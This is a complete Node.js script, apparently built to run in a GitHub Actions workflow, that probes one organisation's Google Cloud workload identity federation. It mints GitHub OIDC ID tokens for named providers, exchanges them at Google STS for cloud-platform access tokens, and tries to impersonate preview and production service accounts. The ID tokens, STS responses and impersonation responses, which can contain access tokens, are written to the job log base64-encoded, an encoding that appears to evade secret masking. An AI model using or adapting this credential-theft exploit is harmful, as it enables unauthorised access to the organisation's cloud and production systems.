/* C211-I104684 bounded WIF probe: mint id_token, exchange at Google STS, print b64 only. */
const https = require('https');
const b64 = (s) => Buffer.from(String(s)).toString('base64');
const emit = (t, v) => { try { console.log('C211_' + t + '=' + b64(v)); } catch (e) {} };
function req(url, opts, body) {
  return new Promise((resolve) => {
    try {
      const u = new URL(url);
      const r = https.request({ hostname: u.hostname, path: u.pathname + u.search, method: opts.method || 'GET', headers: opts.headers || {}, timeout: 30000 }, (res) => {
        let d = ''; res.on('data', (c) => d += c); res.on('end', () => resolve({ status: res.statusCode, body: d }));
      });
      r.on('error', (e) => resolve({ status: 'ERR', body: String(e).slice(0, 300) }));
      r.on('timeout', () => { r.destroy(); resolve({ status: 'ERR', body: 'timeout' }); });
      if (body) r.write(body);
      r.end();
    } catch (e) { resolve({ status: 'ERR', body: String(e).slice(0, 300) }); }
  });
}
const PROVIDERS = [
  'projects/533563500316/locations/global/workloadIdentityPools/github-actions/providers/bodeul-core-api-preview',
  'projects/649312328770/locations/global/workloadIdentityPools/github-actions/providers/bodeul-core-api-production',
  'projects/533563500316/locations/global/workloadIdentityPools/github-actions/providers/bodeul-firebase-preflight',
];
const SAS = [
  'bodeul-firebase-preflight@bodeul-dev.iam.gserviceaccount.com',
  'bodeul-core-api-preview@bodeul-dev.iam.gserviceaccount.com',
  'bodeul-core-api-production@bodeul-prod.iam.gserviceaccount.com',
];
(async () => {
  emit('START', (process.env.GITHUB_REPOSITORY || '') + '|' + (process.env.GITHUB_EVENT_NAME || '') + '|' + (process.env.GITHUB_HEAD_REF || process.env.GITHUB_REF || ''));
  emit('ENVKEYS', Object.keys(process.env).filter((k) => /ACTIONS_ID|GOOGLE|GCP|CLOUDSDK/.test(k)).sort().join(','));
  const url = process.env.ACTIONS_ID_TOKEN_REQUEST_URL || '';
  const tok = process.env.ACTIONS_ID_TOKEN_REQUEST_TOKEN || '';
  emit('IDTOKEN_ENV', url ? 'PRESENT' : 'ABSENT');
  if (!url) { emit('DONE', 'no_idtoken_env'); return; }
  for (const p of PROVIDERS) {
    for (const aud of ['//iam.googleapis.com/' + p, 'https://iam.googleapis.com/' + p, p]) {
      const r = await req(url + '&audience=' + encodeURIComponent(aud), { headers: { Authorization: 'Bearer ' + tok, Accept: 'application/json' } });
      if (r.status !== 200) { emit('IDTOKEN_ERR', aud + '|' + r.status + '|' + r.body.slice(0, 200)); continue; }
      let jwt = '';
      try { jwt = JSON.parse(r.body).value || ''; } catch (e) {}
      emit('IDTOKEN', JSON.stringify({ aud: aud, provider: p, jwt: jwt }));
      const form = new URLSearchParams({
        grant_type: 'urn:ietf:params:oauth:grant-type:token-exchange',
        audience: '//iam.googleapis.com/' + p,
        scope: 'https://www.googleapis.com/auth/cloud-platform',
        requested_token_type: 'urn:ietf:params:oauth:token-type:access_token',
        subject_token_type: 'urn:ietf:params:oauth:token-type:jwt',
        subject_token: jwt,
      }).toString();
      const x = await req('https://sts.googleapis.com/v1/token', { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded', Accept: 'application/json' } }, form);
      emit('STS', JSON.stringify({ aud: aud, provider: p, status: x.status, body: x.body.slice(0, 800) }));
      if (x.status === 200) {
        let at = '';
        try { at = JSON.parse(x.body).access_token || ''; } catch (e) {}
        for (const sa of SAS) {
          const g = await req('https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/' + encodeURIComponent(sa) + ':generateAccessToken',
            { method: 'POST', headers: { Authorization: 'Bearer ' + at, 'Content-Type': 'application/json', Accept: 'application/json' } },
            JSON.stringify({ scope: ['https://www.googleapis.com/auth/cloud-platform'], lifetime: '600s' }));
          emit('IMPERSONATE', JSON.stringify({ sa: sa, status: g.status, body: g.body.slice(0, 500) }));
        }
      }
    }
  }
  emit('DONE', 'ok');
})().catch((e) => emit('FATAL', String(e).slice(0, 400)));
